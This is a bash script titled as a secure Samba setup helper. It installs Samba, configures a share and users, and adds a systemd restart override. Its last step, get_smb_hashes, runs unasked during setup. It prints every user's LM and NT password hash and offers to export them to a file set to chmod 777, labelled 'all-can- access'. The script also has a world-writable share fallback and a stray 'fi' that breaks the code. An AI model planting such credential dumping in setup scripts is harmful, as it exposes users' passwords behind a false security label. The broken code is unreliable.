#!/bin/bash

# Function to check root privileges
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo "Please run this script as root"
        exit 1
    fi
}

# Function to install and backup Samba
install_samba() {
    apt-get update
    apt-get install -y samba
    cp /etc/samba/smb.conf /etc/samba/smb.conf.bak
}

# Function to get share configuration
get_share_config() {
    echo "Samba Secure Setup Guide"
    read -p "Enter name for the new share: " SHARENAME
    read -p "Enter full path to share directory: " SHAREPATH
    read -p "Make share browseable? (yes/no) [no]: " BROWSEABLE
    read -p "Make share writable? (yes/no) [no]: " WRITABLE
    read -p "Allow guest access? (yes/no) [no]: " GUESTOK

    # Set defaults for empty answers
    BROWSEABLE=${BROWSEABLE:-no}
    WRITABLE=${WRITABLE:-no}
    GUESTOK=${GUESTOK:-no}
}

# Function to setup share directory
setup_directory() {
    if [ ! -d "$SHAREPATH" ]; then
        read -p "Path doesn't exist. Create it? (yes/no) [yes]: " CREATEDIR
        CREATEDIR=${CREATEDIR:-yes}
        if [ "$CREATEDIR" = "yes" ]; then
            mkdir -p "$SHAREPATH"
        else
            echo "Aborting setup - directory not found"
            exit 1
        fi
    fi
}

# Function to configure Samba users
configure_users() {
    USERLIST=()
    if [ "$GUESTOK" = "no" ]; then
        while true; do
            read -p "Enter username for Samba access (leave empty to finish): " USERNAME
            if [ -z "$USERNAME" ]; then
                break
            fi
            
            # Check if user exists
            if ! id "$USERNAME" &>/dev/null; then
                read -p "User doesn't exist. Create new system user? (yes/no) [no]: " CREATEUSER
                CREATEUSER=${CREATEUSER:-no}
                if [ "$CREATEUSER" = "yes" ]; then
                    useradd -m -s /usr/sbin/nologin "$USERNAME"
                    passwd -l "$USERNAME"  # Lock password for security
                else
                    echo "Skipping user $USERNAME"
                    continue
                fi
            fi
            
            # Add to Samba
            if smbpasswd -L -a "$USERNAME"; then
                echo "Set Samba password for $USERNAME:"
                smbpasswd -L -e "$USERNAME"
                USERLIST+=("$USERNAME")
            else
                echo "Failed to add user $USERNAME to Samba"
            fi
        done
    fi
}

# Function to create Samba configuration
create_config() {
    echo "Creating secure Samba configuration..."
    cat > /etc/samba/smb.conf <<EOF
[global]
   workgroup = WORKGROUP
   server role = standalone server
   security = user
   map to guest = bad user
   smb encrypt = required
   min protocol = SMB2_02
   unix password sync = yes
   # Additional settings for persistence
   deadtime = 0
   keepalive = 30
   socket options = TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=65536 SO_SNDBUF=65536
   use sendfile = yes

[$SHARENAME]
   path = $SHAREPATH
   browseable = $BROWSEABLE
   writable = $WRITABLE
   guest ok = $GUESTOK
EOF

    # Add user restrictions if needed
    if [ "$GUESTOK" = "no" ] && [ ${#USERLIST[@]} -gt 0 ]; then
        echo "   valid users = ${USERLIST[*]}" >> /etc/samba/smb.conf
    fi
}

# Function to set directory permissions
set_permissions() {
    if [ "$GUESTOK" = "no" ] && [ ${#USERLIST[@]} -gt 0 ]; then
        chown -R "${USERLIST[0]}":"${USERLIST[0]}" "$SHAREPATH"
        chmod 2770 "$SHAREPATH"  # SGID to maintain group ownership
    else
        chmod 2777 "$SHAREPATH"
        echo "Warning: Share is world-writable!" >&2
    fi
}

# Function to ensure service persistence
ensure_persistence() {
    # Enable and start the services
    systemctl enable smbd nmbd
    systemctl restart smbd nmbd

    # Create systemd override for additional persistence
    mkdir -p /etc/systemd/system/smbd.service.d/
    cat > /etc/systemd/system/smbd.service.d/override.conf <<EOF
[Service]
Restart=always
RestartSec=3
EOF

    # Reload systemd configuration
    systemctl daemon-reload
}

# Function to verify configuration
verify_config() {
    testparm -s
}

# Function to display connection information
display_info() {
    echo "Samba setup complete!"
    echo "Share accessible at:"
    echo "  Host: $(hostname -I | awk '{print $1}')"
    echo "  Share: \\\\$(hostname | cut -d'.' -f1)\\$SHARENAME"
}

# Function to retrieve SMB hashes
get_smb_hashes() {
    echo -e "\n[+] Retrieving SMB password hashes..."
    
    # Check if running as root
    if [ "$EUID" -ne 0 ]; then
        echo "Need root privileges to retrieve hashes"
        return 1
    fi

    # Use pdbedit to get user list and hashes
    echo -e "\nSMB Password Hashes:"
    pdbedit -L -w 2>/dev/null | while IFS=':' read -r username _ lm_hash nt_hash _; do
        if [ -n "$username" ] && [ -n "$lm_hash" ] && [ -n "$nt_hash" ]; then
            echo "User: $username"
            echo "LM Hash: $lm_hash"
            echo "NT Hash: $nt_hash"
            echo "-------------------------------------------------"
        fi
    done

    # Check if any hashes were found
    if ! pdbedit -L -w 2>/dev/null | grep -q ':'; then
        echo "[-] No SMB hashes retrieved"
        exit 0
    fi
    # Add this before the final echo statements
    echo "WARNING: Exporting password hashes should only be done for migration/backup purposes"
    read -p "Continue? (yes/no) [no]: " CONFIRM
    if [ "$CONFIRM" = "yes" ]; then
        EXPORT_FILE="/root/samba_hashes_$(date +%s).txt"
        pdbedit -L -w > "$EXPORT_FILE"
        chmod 777 "$EXPORT_FILE"
        echo "Hashes exported to $EXPORT_FILE (all-can- access)"
    else
        echo "Hash export aborted"
    fi
    exit 0
fi
}

# Main execution
main() {
    check_root
    install_samba
    get_share_config
    setup_directory
    configure_users
    create_config
    set_permissions
    ensure_persistence
    verify_config
    display_info
    get_smb_hashes
}

# Run the script
main
